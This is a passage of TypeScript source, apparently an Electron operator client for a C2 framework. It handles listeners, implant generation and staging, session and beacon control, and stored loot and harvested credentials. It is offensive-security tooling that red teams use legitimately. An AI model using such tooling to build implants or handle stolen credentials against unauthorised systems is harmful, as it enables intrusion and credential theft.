              requestId: randomUUID(),
              ownerWindowId: contentsId,
              target: { ...remaining.summary },
              status: "skipped",
              error: "The backend connection changed before this action was dispatched",
            });
          }
          break;
        }
        if (isBulkPruneAction(plan.actionId)) {
          try {
            await pool.refreshDomains(domains);
          } catch {
            for (const remaining of plan.targets.slice(index)) {
              outcomes.push({
                requestId: randomUUID(),
                ownerWindowId: contentsId,
                target: { ...remaining.summary },
                status: "skipped",
                error: "The target inventory could not be revalidated immediately before dispatch",
              });
            }
            break;
          }
          if (!bindingCurrent()) {
            for (const remaining of plan.targets.slice(index)) {
              outcomes.push({
                requestId: randomUUID(),
                ownerWindowId: contentsId,
                target: { ...remaining.summary },
                status: "skipped",
                error: "The backend connection changed before this action was dispatched",
              });
            }
            break;
          }
          const revalidated = this.targetActionCandidates(context, pool, plan.actionId).targets
            .find((candidate) => candidate.summary.mode === target.summary.mode && candidate.summary.id === target.summary.id);
          if (!revalidated || !sameTargetPlanResources([target], [revalidated])) {
            outcomes.push({
              requestId: randomUUID(),
              ownerWindowId: contentsId,
              target: { ...target.summary },
              status: "skipped",
              error: "The target changed or is no longer eligible immediately before dispatch",
            });
            continue;
          }
        }
        const requestId = randomUUID();
        try {
          const status = await executeTargetAction(pool.client, plan.actionId, target.summary);
          if (
            status === "succeeded" &&
            target.summary.mode === "beacon" &&
            (plan.actionId === "beacon.remove" || plan.actionId === "beacons.prune-overdue")
          ) {
            pool.beaconTasks.removeBeacon(target.summary.id);
          }
          outcomes.push({ requestId, ownerWindowId: contentsId, target: { ...target.summary }, status });
        } catch {
          outcomes.push({
            requestId,
            ownerWindowId: contentsId,
            target: { ...target.summary },
            status: "outcome-unknown",
            error: "The action was dispatched, but its outcome could not be confirmed",
          });
        }
      }
      const reconciled = poolCurrent()
        ? await pool.refreshDomains(domains).then(() => poolCurrent(), () => false)
        : false;
      if (reconciled) {
        for (const outcome of outcomes) {
          if (outcome.status !== "outcome-unknown" || !targetActionRemovesResource(plan.actionId, outcome.target)) {
            continue;
          }
          const mode = outcome.target.mode;
          if (targetDomainAbsenceAuthoritative(pool, mode) && !pool.targetStore.target(mode, outcome.target.id)) {
            outcome.status = "succeeded";
            delete outcome.error;
            if (mode === "beacon") pool.beaconTasks.removeBeacon(outcome.target.id);
          }
        }
      }
      return { ok: true, value: {
        actionId: plan.actionId,
        outcomes,
        partial: outcomes.some((outcome) => outcome.status !== "succeeded") &&
          outcomes.some((outcome) => outcome.status === "succeeded"),
      } };
    } catch (error) {
      return { ok: false, error: errorMessage(error) };
    }
  }

  private targetActionCandidates(
    context: WindowContext,
    pool: BackendPool,
    actionId: DestructiveTargetActionId,
  ): { targets: Array<{ summary: TargetSummary; ref: TargetRef }>; totalTargets: number } {
    if (actionId === "sessions.prune-dead" || actionId === "beacons.prune-overdue") {
      const mode = actionId === "sessions.prune-dead" ? "session" : "beacon";
      const domain = mode === "session" ? pool.snapshot.domains.sessions : pool.snapshot.domains.beacons;
      if (domain.status !== "ready" && domain.status !== "empty") {
        throw new Error("The complete target inventory is not authoritative; refresh it before pruning");
      }
      const candidates = pool.targetStore.catalogPage(mode, 0, Number.MAX_SAFE_INTEGER).items.filter((target) =>
        target.mode === "session" ? target.liveness === "dead" : target.checkinStatus === "overdue",
      );
      const targets = candidates.slice(0, MAX_TARGETS_PER_ACTION_PLAN).map((summary) => {
        const ref = pool.targetStore.createTargetRef(summary.mode, summary.id, pool.epoch);
        if (!ref) throw new Error("A target changed while preparing the action plan");
        return { summary: { ...summary }, ref };
      });
      return { targets, totalTargets: candidates.length };
    }

    if (!context.activeTarget) throw new Error("Select a target before preparing this action");
    assertTargetDomainAuthoritative(pool, context.activeTarget.mode);
    const current = pool.targetStore.revalidateTargetRef(context.activeTarget, pool.epoch);
    if (!current) throw new Error("The selected target is no longer available");
    if (actionId === "session.close" && current.target.mode !== "session") {
      throw new Error("Close is available only for sessions");
    }
    if (actionId === "beacon.remove" && current.target.mode !== "beacon") {
      throw new Error("Remove is available only for beacons");
    }
    const capabilityId = actionId === "target.kill"
      ? "target.terminate"
      : actionId === "session.close"
        ? "session.close"
        : "beacon.remove";
    const capability = targetCapability(
      calculatePoolTargetCapabilities(pool, current.target),
      capabilityId,
    );
    if (!capability.available) {
      throw new Error(capability.reason?.message ?? "The selected target action is unavailable");
    }
    return { targets: [{ summary: current.target, ref: current.ref }], totalTargets: 1 };
  }

  private pruneTargetPlans(context: WindowContext): void {
    const now = this.now();
    for (const [token, plan] of context.targetPlans) {
      if (plan.expiresAt <= now) context.targetPlans.delete(token);
    }
  }

  async chooseCertificatePair(sender: WebContents): Promise<OperationResult<CertificatePairSelection>> {
    const contentsId = sender.id;
    try {
      const owner = requireOwnerWindow(sender);
      const certificate = await dialog.showOpenDialog(owner, {
        title: "Choose PEM Certificate",
        properties: ["openFile"],
        filters: [{ name: "PEM certificate", extensions: ["pem", "crt", "cer"] }],
      });
      const certificatePath = certificate.filePaths[0];
      if (certificate.canceled || !certificatePath) return { ok: false, error: "Certificate selection canceled" };

      const key = await dialog.showOpenDialog(owner, {
        title: "Choose PEM Private Key",
        properties: ["openFile"],
        filters: [{ name: "PEM private key", extensions: ["pem", "key"] }],
      });
      const keyPath = key.filePaths[0];
      if (key.canceled || !keyPath) return { ok: false, error: "Private key selection canceled" };

      let certData: Buffer | undefined;
      let keyData: Buffer | undefined;
      try {
        certData = (await readBoundedRegularFile(certificatePath, {
          label: "Selected certificate",
          maxBytes: MAX_CERTIFICATE_BYTES,
        })).data;
        keyData = (await readBoundedRegularFile(keyPath, {
          label: "Selected private key",
          maxBytes: MAX_KEY_BYTES,
          requirePrivateMode: true,
        })).data;
        createSecureContext({ cert: certData, key: keyData });
        const token = randomUUID();
        const context = this.requireWindow(contentsId);
        context.certificatePairs.set(token, {
          cert: certData,
          key: keyData,
          expiresAt: this.now() + CERTIFICATE_CAPABILITY_TTL_MS,
        });
        const expiryTimer = setTimeout(() => {
          const current = this.windows.get(contentsId)?.certificatePairs.get(token);
          if (!current || current.expiresAt > this.now()) return;
          clearCertificatePair(current);
          this.windows.get(contentsId)?.certificatePairs.delete(token);
          this.windows.get(contentsId)?.certificateTimers.delete(token);
        }, CERTIFICATE_CAPABILITY_TTL_MS);
        expiryTimer.unref();
        context.certificateTimers.set(token, expiryTimer);
        return {
          ok: true,
          value: {
            token,
            certificateName: sanitizeSavedConfigMetadata(basename(certificatePath)),
            keyName: sanitizeSavedConfigMetadata(basename(keyPath)),
          },
        };
      } catch (error) {
        certData?.fill(0);
        keyData?.fill(0);
        throw error;
      }
    } catch (error) {
      return { ok: false, error: errorMessage(error) };
    }
  }

  async startListener(contentsId: number, request: StartListenerRequest): Promise<OperationResult<StartListenerResult>> {
    return this.withPool(contentsId, async (pool, assertBinding) => {
      const input = request.listener;
      validateListener(input);
      const managedServer = request.addManagedFirewallRule
        ? this.managedServerForConnection(pool, pool.snapshot.connection.status)
        : null;
      let jobId: number;

      switch (input.kind) {
        case "mtls": {
          assertBinding();
          const response = await pool.client.startMTLSListener(input.host.trim(), input.port);
          jobId = response.JobID;
          break;
        }
        case "wireguard": {
          assertBinding();
          const response = await pool.client.startWGListener(
            input.host.trim(),
            input.port,
            input.tunnelIp.trim(),
            input.tcpCommsPort,
            input.keyExchangePort,
          );
          jobId = response.JobID;
          break;
        }
        case "dns": {
          const domains = splitList(input.domains).map(ensureTrailingDot);
          assertBinding();
          const response = await pool.client.startDNSListener(
            domains,
            input.canaries,
            input.host.trim(),
            input.port,
            input.enforceOtp,
          );
          jobId = response.JobID;
          break;
        }
        case "http":
        case "https": {
          assertBinding();
          jobId = await this.startHttpListener(contentsId, pool, input);
          break;
        }
        case "stage": {
          assertBinding();
          jobId = await this.startStageListener(pool, input);
          break;
        }
        default: {
          return assertNever(input);
        }
      }

      const fallbackJob: JobSummary = {
        id: jobId,
        name: input.kind,
        description: "Listener starting",
        protocol: input.kind,
        port: input.port,
        domains: [],
        profileName: input.kind === "stage" ? input.profileName : "",
      };
      let bindingChanged = false;
      try {
        assertBinding();
      } catch {
        bindingChanged = true;
      }
      if (!bindingChanged) {
        try {
          await pool.refreshDomains(["jobs"]);
        } catch {
          // JobID confirms the listener mutation. A failed inventory refresh must not invite a duplicate retry.
        }
        try {
          assertBinding();
        } catch {
          bindingChanged = true;
        }
      }
      const job = pool.snapshot.jobs.find((candidate) => candidate.id === jobId) ?? fallbackJob;
      let firewall: ManagedListenerFirewallOutcome = { status: "not-requested", ruleCount: 0 };
      if (request.addManagedFirewallRule) {
        if (bindingChanged) {
          firewall = {
            status: "failed",
            ruleCount: 0,
            error: "The backend connection changed before the firewall rule could be applied",
          };
        } else if (!managedServer) {
          firewall = {
            status: "failed",
            ruleCount: 0,
            error: "The connected server is not managed by a cloud deployment",
          };
        } else {
          const currentManagedServer = this.managedServerForConnection(pool, pool.snapshot.connection.status);
          if (!sameManagedServerDeployment(managedServer, currentManagedServer)) {
            firewall = {
              status: "failed",
              ruleCount: 0,
              error: "The managed server deployment changed before the firewall rule could be applied",
            };
          } else {
            firewall = await invokeManagedListenerFirewall(
              this.managedListenerFirewall,
              "ensureIngress",
              {
                server: managedServer,
                protocol: listenerFirewallProtocol(input.kind),
                port: input.port,
              },
            );
          }
        }
      }
      return { job, firewall };
    }, false);
  }

  async prepareStopJob(contentsId: number, jobId: number): Promise<OperationResult<JobStopPlan>> {
    return this.withPool(contentsId, async (pool) => {
      if (!Number.isSafeInteger(jobId) || jobId < 0) throw new Error("Invalid job ID");
      const job = pool.snapshot.jobs.find((candidate) => candidate.id === jobId);
      if (!job) throw new Error(`Job #${jobId} is no longer active`);
      return this.createStopPlan(contentsId, pool, [job], false);
    });
  }

  async prepareStopAllJobs(contentsId: number): Promise<OperationResult<JobStopPlan>> {
    return this.withPool(contentsId, async (pool) => {
      if (pool.snapshot.domains.jobs.page.truncated) {
        throw new Error(
          "Stop all is unavailable while the active job inventory is truncated; stop jobs individually or reduce the active set",
        );
      }
      const jobs = [...pool.snapshot.jobs];
      if (jobs.length === 0) throw new Error("There are no active jobs to stop");
      return this.createStopPlan(contentsId, pool, jobs, true);
    });
  }

  async executeStopPlan(
    contentsId: number,
    input: ExecuteJobStopPlanInput,
  ): Promise<OperationResult<JobStopExecutionResult>> {
    const context = this.requireWindow(contentsId);
    this.pruneStopPlans(context);
    const plan = context.stopPlans.get(input.token);
    context.stopPlans.delete(input.token);
    if (!plan || plan.contentsId !== contentsId || plan.expiresAt <= this.now()) {
      return { ok: false, error: "The job-stop confirmation expired; review the current resources again" };
    }
    return this.withPool(contentsId, async (pool) => {
      const assertPlanBinding = (): void => {
        if (
          this.windows.get(contentsId) !== context ||
          context.poolKey !== plan.poolKey ||
          this.pools.get(plan.poolKey) !== pool ||
          pool.epoch !== plan.epoch
        ) {
          throw new Error("The backend connection changed; review the current resources again");
        }
      };
      assertPlanBinding();
      await pool.refreshDomains(["jobs"]);
      assertPlanBinding();
      if (plan.stopsAll && pool.snapshot.domains.jobs.page.truncated) {
        throw new Error("The active job inventory is truncated; review the current resources again");
      }
      const current = pool.snapshot.jobs;
      const currentFingerprints = current.map(jobFingerprint).sort();
      const plannedFingerprints = [...plan.fingerprints].sort();
      const currentById = new Map(current.map((job) => [job.id, job]));
      const drifted = plan.jobs.some((job, index) => jobFingerprint(currentById.get(job.id)) !== plan.fingerprints[index]);
      if (drifted || (plan.stopsAll && !sameStrings(currentFingerprints, plannedFingerprints))) {
        throw new Error("The active job set changed; review the current resources again");
      }

      const confirmedStoppedIds = new Set<number>();
      const killFailedIds = new Set<number>();
      let bindingChangedAfterMutation = false;
      for (const job of plan.jobs) {
        try {
          assertPlanBinding();
        } catch (error) {
          if (confirmedStoppedIds.size === 0 && killFailedIds.size === 0) throw error;
          bindingChangedAfterMutation = true;
          break;
        }
        try {
          const result = await pool.client.killJob(job.id);
          if (result.Success) confirmedStoppedIds.add(job.id);
          else killFailedIds.add(job.id);
        } catch {
          killFailedIds.add(job.id);
        }
        try {
          assertPlanBinding();
        } catch {
          bindingChangedAfterMutation = true;
          break;
        }
      }
      const undispatchedIds = plan.jobs
        .filter((job) => !confirmedStoppedIds.has(job.id) && !killFailedIds.has(job.id))
        .map((job) => job.id);
      for (const jobId of undispatchedIds) killFailedIds.add(jobId);

      if (bindingChangedAfterMutation) {
        if (confirmedStoppedIds.size === 0) {
          throw new Error("The backend connection changed before any job stop was confirmed");
        }
        return {
          stoppedJobIds: [...confirmedStoppedIds],
          failedJobIds: [...killFailedIds],
          firewall: input.removeManagedFirewallRule && plan.managedFirewall
            ? {
                status: "outcome-unknown",
                ruleCount: 0,
                error:
                  "The listener stop was confirmed, but the backend changed before its cloud firewall rule could be reviewed. Review the rule in Cloud Deployment.",
              }
            : { status: "not-requested", ruleCount: 0 },
        };
      }

      try {
        await pool.refreshDomains(["jobs"]);
        assertPlanBinding();
      } catch (error) {
        if (confirmedStoppedIds.size === 0) throw error;
        return {
          stoppedJobIds: [...confirmedStoppedIds],
          failedJobIds: plan.jobs
            .filter((job) => !confirmedStoppedIds.has(job.id))
            .map((job) => job.id),
          firewall: input.removeManagedFirewallRule && plan.managedFirewall
            ? {
                status: "outcome-unknown",
                ruleCount: 0,
                error:
                  "The listener stop was confirmed, but the active jobs could not be refreshed before its cloud firewall rule was reviewed. Review the rule in Cloud Deployment.",
              }
            : { status: "not-requested", ruleCount: 0 },
        };
      }
      const remainingIds = new Set(pool.snapshot.jobs.map((job) => job.id));
      const stoppedJobIds = plan.jobs.filter((job) => !remainingIds.has(job.id)).map((job) => job.id);
      const failedJobIds = plan.jobs.filter((job) => remainingIds.has(job.id)).map((job) => job.id);
      if (failedJobIds.length > 0) {
        if (stoppedJobIds.length > 0) {
          return {
            stoppedJobIds,
            failedJobIds,
            firewall: input.removeManagedFirewallRule && plan.managedFirewall
              ? {
                  status: "retained",
                  ruleCount: 0,
                  error: "The cloud firewall rule was retained because the listener stop was only partially successful",
                }
              : { status: "not-requested", ruleCount: 0 },
          };
        }
        throw new Error(`Failed to stop jobs ${failedJobIds.map((jobId) => `#${jobId}`).join(", ")}`);
      }

      let firewall: ManagedListenerFirewallOutcome = input.removeManagedFirewallRule && plan.managedFirewall
        ? { status: "retained", ruleCount: 0 }
        : { status: "not-requested", ruleCount: 0 };
      if (input.removeManagedFirewallRule && plan.managedFirewall) {
        const stoppedManagedJob = stoppedJobIds.includes(plan.jobs[0]!.id);
        const tupleStillInUse = pool.snapshot.jobs.some((job) =>
          sameManagedFirewallTuple(plan.managedFirewall!, managedFirewallImpactForJob(plan.managedFirewall!.server, job))
        );
        if (stoppedManagedJob && !tupleStillInUse) {
          const currentManagedServer = this.managedServerForConnection(pool, pool.snapshot.connection.status);
          if (!sameManagedServerDeployment(plan.managedFirewall.server, currentManagedServer)) {
            firewall = {
              status: "failed",
              ruleCount: 0,
              error: "The managed server deployment changed before the firewall rule could be removed",
            };
          } else {
            assertPlanBinding();
            firewall = await invokeManagedListenerFirewall(
              this.managedListenerFirewall,
              "removeIngress",
              plan.managedFirewall,
            );
          }
        }
      }
      return { stoppedJobIds, failedJobIds, firewall };
    }, false);
  }

  private createStopPlan(
    contentsId: number,
    pool: BackendPool,
    jobs: JobSummary[],
    stopsAll: boolean,
  ): JobStopPlan {
    const context = this.requireWindow(contentsId);
    this.pruneStopPlans(context);
    const token = randomUUID();
    const expiresAt = this.now() + JOB_STOP_PLAN_TTL_MS;
    const safeJobs = jobs.map((job) => ({ ...job, domains: [...job.domains] }));
    const managedServer = stopsAll
      ? null
      : this.managedServerForConnection(pool, pool.snapshot.connection.status);
    const managedFirewall = managedServer && safeJobs.length === 1
      ? managedFirewallImpactForJob(managedServer, safeJobs[0]!)
      : null;
    context.stopPlans.set(token, {
      token,
      expiresAt,
      contentsId,
      poolKey: pool.key,
      epoch: pool.epoch,
      jobs: safeJobs,
      fingerprints: safeJobs.map(jobFingerprint),
      stopsAll,
      managedFirewall,
    });
    const connection = pool.snapshot.connection;
    return {
      token,
      expiresAt: new Date(expiresAt).toISOString(),
      impact: {
        backend: {
          server: connection.server ?? "Unknown server",
          operator: connection.operator ?? "Unknown operator",
          configName: context.configName ?? connection.configName ?? "Unknown configuration",
          epoch: pool.epoch,
          sharedWindowCount: pool.windowCount,
        },
        jobs: safeJobs,
        stopsAll,
        managedFirewall,
        warning:
          "These server-owned listeners may be shared with other operators; stopping them can remove active callback paths.",
      },
    };
  }

  private pruneStopPlans(context: WindowContext): void {
    const now = this.now();
    for (const [token, plan] of context.stopPlans) if (plan.expiresAt <= now) context.stopPlans.delete(token);
  }

  async generate(sender: WebContents, input: GenerateInput): Promise<OperationResult<SavedArtifact>> {
    const contentsId = sender.id;
    const owner = requireOwnerWindow(sender);
    return this.withPool(contentsId, async (pool, assertBinding) => {
      pool.assertCompilerTarget(input);
      const needsWireGuardIp = /(^|[\n,])\s*wg:\/\//i.test(input.c2) && !input.wgPeerTunIp.trim();
      const uniqueIp = needsWireGuardIp ? (await pool.client.generateUniqueIP()).IP : "";
      const config = buildImplantConfig(input, uniqueIp);
      assertBinding();
      const response = await pool.client.generateImplant(
        config,
        validateImplantName(input.name),
        GENERATE_TIMEOUT_SECONDS,
      );
      assertBinding();
      const saved = await saveArtifact(owner, response);
      assertBinding();
      await pool.refreshDomains(["builds"]);
      return saved;
    });
  }

  async generateFromProfile(
    sender: WebContents,
    input: GenerateFromProfileInput,
  ): Promise<OperationResult<SavedArtifact>> {
    const contentsId = sender.id;
    const owner = requireOwnerWindow(sender);
    return this.withPool(contentsId, async (pool, assertBinding) => {
      const profile = pool.profile(input.profileName);
      if (!profile.Config) throw new Error(`Profile '${input.profileName}' has no implant configuration`);
      assertBinding();
      const response = await pool.client.generateImplant(
        profile.Config,
        validateImplantName(input.name),
        GENERATE_TIMEOUT_SECONDS,
      );
      assertBinding();
      const saved = await saveArtifact(owner, response);
      assertBinding();
      await pool.refreshDomains(["builds"]);
      return saved;
    });
  }

  async downloadBuild(sender: WebContents, buildName: string): Promise<OperationResult<SavedArtifact>> {
    const contentsId = sender.id;
    const owner = requireOwnerWindow(sender);
    return this.withPool(contentsId, async (pool, assertBinding) => {
      const normalized = requireKnownName(buildName, "Build name");
      if (!pool.hasBuild(normalized)) throw new Error(`Unknown build '${normalized}'`);
      assertBinding();
      const response = await pool.client.regenerateImplant(normalized, GENERATE_TIMEOUT_SECONDS);
      assertBinding();
      return saveArtifact(owner, response);
    });
  }

  async deleteBuild(contentsId: number, buildName: string): Promise<OperationResult> {
    return this.withPoolWithoutValue(contentsId, async (pool, assertBinding) => {
      const normalized = requireKnownName(buildName, "Build name");
      if (!pool.hasBuild(normalized)) throw new Error(`Unknown build '${normalized}'`);
      assertBinding();
      await pool.client.deleteImplantBuild(normalized);
      assertBinding();
      await pool.refreshDomains(["builds"]);
    });
  }

  async setStagedBuilds(contentsId: number, buildNames: string[]): Promise<OperationResult> {
    return this.withPoolWithoutValue(contentsId, async (pool, assertBinding) => {
      const inventory = pool.snapshot.domains.builds;
      if ((inventory.status !== "ready" && inventory.status !== "empty") || inventory.page.truncated) {
        throw new Error("The complete build inventory is not authoritative; refresh it before replacing the staging set");
      }
      const unique = [...new Set(buildNames.map((name) => requireKnownName(name, "Build name")))];
      for (const name of unique) if (!pool.hasBuild(name)) throw new Error(`Unknown build '${name}'`);
      assertBinding();
      await pool.client.stageImplantBuild(unique);
      assertBinding();
      await pool.refreshDomains(["builds"]);
    });
  }

  async saveProfile(contentsId: number, input: SaveProfileInput): Promise<OperationResult<ProfileSummary>> {
    return this.withPool(contentsId, async (pool, assertBinding) => {
      const inventory = pool.snapshot.domains.profiles;
      if ((inventory.status !== "ready" && inventory.status !== "empty") || inventory.page.truncated) {
        throw new Error("The complete profile inventory is not authoritative; refresh it before saving a profile");
      }
      const name = normalizeProfileName(input.profileName);
      const exists = pool.hasProfile(name);
      if (exists && !input.overwrite) throw new Error(`Profile '${name}' already exists; confirm replacement first`);
      if (!exists && input.overwrite) throw new Error(`Profile '${name}' no longer exists; review the profile name again`);
      const needsWireGuardIp = /(^|[\n,])\s*wg:\/\//i.test(input.config.c2) && !input.config.wgPeerTunIp.trim();
      const uniqueIp = needsWireGuardIp ? (await pool.client.generateUniqueIP()).IP : "";
      const config = buildImplantConfig(input.config, uniqueIp);
      assertBinding();
      await pool.client.saveImplantProfile(clientpb.ImplantProfile.create({ ID: "", Name: name, Config: config }));
      assertBinding();
      await pool.refreshDomains(["profiles"]);
      const profile = pool.snapshot.profiles.find((item) => item.name === name);
      if (!profile) throw new Error(`Profile '${name}' was saved but could not be reloaded`);
      return profile;
    });
  }

  async deleteProfile(contentsId: number, profileName: string): Promise<OperationResult> {
    return this.withPoolWithoutValue(contentsId, async (pool, assertBinding) => {
      const normalized = requireKnownName(profileName, "Profile name");
      pool.profile(normalized);
      assertBinding();
      await pool.client.deleteImplantProfile(normalized);
      assertBinding();
      await pool.refreshDomains(["profiles"]);
    });
  }

  async listLoot(contentsId: number, input: ListLootInput): Promise<OperationResult<LootCatalogPage>> {
    return this.withPool(contentsId, async (pool, assertBinding) => {
      const loot = await pool.client.lootAll();
      try {
        assertBinding();
        const query = (input.query ?? "").trim().toLocaleLowerCase();
        const fileType = input.fileType ?? "all";
        const items = loot
          .map((item) => lootSummary(item))
          .filter((item) => fileType === "all" || item.fileType === fileType)
          .filter((item) => !query || [item.name, item.fileName, item.originHostId, item.id]
            .some((value) => value.toLocaleLowerCase().includes(query)))
          .sort((left, right) => left.name.localeCompare(right.name) || left.id.localeCompare(right.id));
        return operatorDataPage(items, input.cursor, input.limit);
      } finally {
        for (const item of loot) item.File?.Data.fill(0);
      }
    });
  }

  async addLoot(sender: WebContents, input: AddLootInput): Promise<OperationResult<LootSummary>> {
    const owner = requireOwnerWindow(sender);
    return this.withPool(sender.id, async (pool, assertBinding) => {
      const selection = await dialog.showOpenDialog(owner, {
        title: "Add local file to loot",
        properties: ["openFile"],
      });
      assertBinding();
      const filePath = selection.filePaths[0];
      if (selection.canceled || !filePath) throw new Error("Loot selection canceled");
      return this.addLootFromPath(pool, assertBinding, filePath, input);
    });
  }

  async addDroppedLoot(sender: WebContents, sourcePath: string): Promise<OperationResult<LootSummary>> {
    return this.withPool(sender.id, (pool, assertBinding) =>
      this.addLootFromPath(pool, assertBinding, sourcePath, { name: "", fileType: "auto" }));
  }

  private async addLootFromPath(
    pool: BackendPool,
    assertBinding: () => void,
    filePath: string,
    input: AddLootInput,
  ): Promise<LootSummary> {
    const selected = await readBoundedRegularFile(filePath, {
      label: "Loot source",
      maxBytes: OPERATOR_DATA_LIMITS.artifactBytes,
    });
    try {
      assertBinding();
      const fileName = safeArtifactFileName(basename(filePath));
      const name = input.name.trim() ? requireKnownName(input.name, "Loot name") : fileName;
      const fileType = input.fileType === "text" || (
        input.fileType === "auto" && isProbablyTextLoot(selected.data)
      )
        ? clientpb.FileType.TEXT
        : clientpb.FileType.BINARY;
      const response = await pool.client.lootAdd(clientpb.Loot.create({
        Name: name,
        FileType: fileType,
        File: commonpb.File.create({ Name: fileName, Data: selected.data }),
      }));
      try {
        assertBinding();
        return lootSummary(response);
      } finally {
        response.File?.Data.fill(0);
      }
    } finally {
      selected.data.fill(0);
    }
  }

  async getLootDetail(contentsId: number, lootId: string): Promise<OperationResult<LootDetail>> {
    return this.withPool(contentsId, async (pool, assertBinding) => {
      const item = await loadLootSummary(pool.client, lootId);
      assertBinding();
      const declaredSize = decimalByteSize(item.sizeBytes);
      if (declaredSize === 0n) return { item, previewState: "empty", preview: new Uint8Array() };
      const previewLimit = item.fileType === "text"
        ? OPERATOR_DATA_LIMITS.previewBytes
        : OPERATOR_DATA_LIMITS.mediaPreviewBytes;
      if (declaredSize > BigInt(previewLimit)) {
        return { item, previewState: "too-large", preview: new Uint8Array() };
      }
      const response = await pool.client.lootContent(lootId);
      const data = response.File?.Data;
      if (!data) throw new Error("The server returned no loot content");
      try {
        assertBinding();
        if (response.ID && response.ID !== lootId) throw new Error("The loot changed while its preview was loading");
        if (data.byteLength > previewLimit) {
          throw new Error("The loot preview exceeds the in-memory preview limit");
        }
        if (data.byteLength === 0) return { item, previewState: "empty", preview: new Uint8Array() };
        if (item.fileType === "binary") {
          const mediaMimeType = sniffLootMediaMimeType(data);
          return mediaMimeType
            ? {
              item,
              previewState: mediaMimeType.startsWith("image/") ? "image" : "video",
              preview: new Uint8Array(data),
              mediaMimeType,
            }
            : { item, previewState: "binary", preview: new Uint8Array() };
        }
        return {
          item,
          previewState: "text",
          preview: new Uint8Array(data),
        };
      } finally {
        data.fill(0);
      }
    });
  }

  async downloadLoot(sender: WebContents, lootId: string): Promise<OperationResult<LootDownloadResult>> {
    const owner = requireOwnerWindow(sender);
    return this.withPool(sender.id, async (pool, assertBinding) => {
      const item = await loadLootSummary(pool.client, lootId);
      assertBinding();
      if (decimalByteSize(item.sizeBytes) > BigInt(OPERATOR_DATA_LIMITS.artifactBytes)) {
        throw new Error("The loot exceeds the local artifact size limit");
      }
      const fileName = safeArtifactFileName(item.fileName || item.name);
      const selection = await dialog.showSaveDialog(owner, {
        title: "Save loot",
        defaultPath: fileName,
      });
      assertBinding();
      if (selection.canceled || !selection.filePath) return { saved: false, fileName, size: 0 };
      const intent = await this.reserveSessionSaveIntent(selection.filePath);
      assertBinding();
      const response = await pool.client.lootContent(lootId);
      const data = response.File?.Data;
      if (!data) throw new Error("The server returned no loot content");
      try {
        assertBinding();
        if (response.ID && response.ID !== lootId) throw new Error("The loot changed while it was downloading");
        if (data.byteLength > OPERATOR_DATA_LIMITS.artifactBytes) {
          throw new Error("The loot exceeds the local artifact size limit");
        }
        const ownedCopy = Buffer.from(data);
        try {
          await this.commitSessionSaveIntent(intent, ownedCopy, assertBinding);
          return { saved: true, fileName, size: data.byteLength };
        } finally {
          ownedCopy.fill(0);
        }
      } finally {
        data.fill(0);
      }
    });
  }

  async renameLoot(contentsId: number, input: RenameLootInput): Promise<OperationResult<LootSummary>> {
    return this.withPool(contentsId, async (pool, assertBinding) => {
      await loadLootSummary(pool.client, input.id);
      assertBinding();
      const response = await pool.client.lootUpdate(clientpb.Loot.create({
        ID: input.id,
        Name: requireKnownName(input.name, "Loot name"),
      }));
      try {
        assertBinding();
        return lootSummary(response);
      } finally {
        response.File?.Data.fill(0);
      }
    });
  }

  async deleteLoot(contentsId: number, lootId: string): Promise<OperationResult> {
    return this.withPoolWithoutValue(contentsId, async (pool, assertBinding) => {
      await loadLootSummary(pool.client, lootId);
      assertBinding();
      await pool.client.lootRemove(lootId);
      assertBinding();
    });
  }

  async listCredentials(
    contentsId: number,
    input: ListCredentialsInput,
  ): Promise<OperationResult<CredentialCatalogPage>> {
    return this.withPool(contentsId, async (pool, assertBinding) => {
      const credentials = await pool.client.credentialsAll();
      try {
        assertBinding();
        const summaries = credentials.map((credential) => credentialSummary(credential));
        const collections = [...new Set(summaries.map((item) => item.collection).filter(Boolean))]
          .sort((left, right) => left.localeCompare(right));
        const query = (input.query ?? "").trim().toLocaleLowerCase();
        const kind = input.kind ?? "all";
        const filtered = summaries
          .filter((item) => (
            kind === "all" ||
            (kind === "plaintext" && item.hasPlaintext) ||
            (kind === "hash" && item.hasHash) ||
            (kind === "cracked" && item.isCracked)
          ))
          .filter((item) => !query || [
            item.username,
            item.collection,
            item.originHostId,
            item.hashTypeName,
            item.id,
          ].some((value) => value.toLocaleLowerCase().includes(query)))
          .sort((left, right) => left.username.localeCompare(right.username) || left.id.localeCompare(right.id));
        return {
          ...operatorDataPage(filtered, input.cursor, input.limit),
          collections,
          hashTypes: credentialHashTypeOptions(),
        };
      } finally {
        for (const credential of credentials) clearCredentialSecrets(credential);
      }
    });
  }

  async revealCredentialSecret(
    contentsId: number,
    input: RevealCredentialSecretInput,
  ): Promise<OperationResult<CredentialSecretReveal>> {
    return this.withPool(contentsId, async (pool, assertBinding) => {
      const credential = await pool.client.credentialById(input.id);
      try {
        assertBinding();
        if (credential.ID !== input.id) throw new Error("The credential changed while its secret was loading");
        const secret = credentialSecret(credential, input.field);
        if (!secret) throw new Error(`This credential has no ${input.field} value`);
        return {
          item: credentialSummary(credential),
          field: input.field,
          value: new TextEncoder().encode(secret),
        };
      } finally {
        clearCredentialSecrets(credential);
      }
    });
  }

  async addCredential(contentsId: number, input: AddCredentialInput): Promise<OperationResult> {
    try {
      return await this.withPoolWithoutValue(contentsId, async (pool, assertBinding) => {
        const plaintext = new TextDecoder("utf-8", { fatal: true }).decode(input.plaintext);
        const hash = new TextDecoder("utf-8", { fatal: true }).decode(input.hash);
        if (!plaintext && !hash) throw new Error("A plaintext value or hash is required");
        let hashType = clientpb.HashType.INVALID;
        if (hash) {
          if (input.hashType === null) {
            const detected = await pool.client.credentialSniffHashType(hash);
            assertBinding();
            hashType = detected;
          } else {
            hashType = input.hashType;
          }
          if (!credentialHashTypeValues().has(hashType)) {
            throw new Error("The hash type is unsupported or could not be detected");
          }
        } else if (input.hashType !== null) {
          throw new Error("A hash type may only be selected when a hash is provided");
        }
        await pool.client.credentialAdd(clientpb.Credential.create({
          Username: boundedServerText(input.username, OPERATOR_DATA_LIMITS.usernameCharacters),
          Collection: boundedServerText(input.collection, OPERATOR_DATA_LIMITS.collectionCharacters),
          Plaintext: plaintext,
          Hash: hash,
          HashType: hashType,
          IsCracked: Boolean(hash && plaintext),
        }));
        assertBinding();
      });
    } finally {
      input.plaintext.fill(0);
      input.hash.fill(0);
    }
  }

  async deleteCredential(contentsId: number, credentialId: string): Promise<OperationResult> {
    return this.withPoolWithoutValue(contentsId, async (pool, assertBinding) => {
      const credential = await pool.client.credentialById(credentialId);
      try {
        assertBinding();
        if (credential.ID !== credentialId) throw new Error("The credential changed before it could be removed");
        await pool.client.credentialRemove(credentialId);
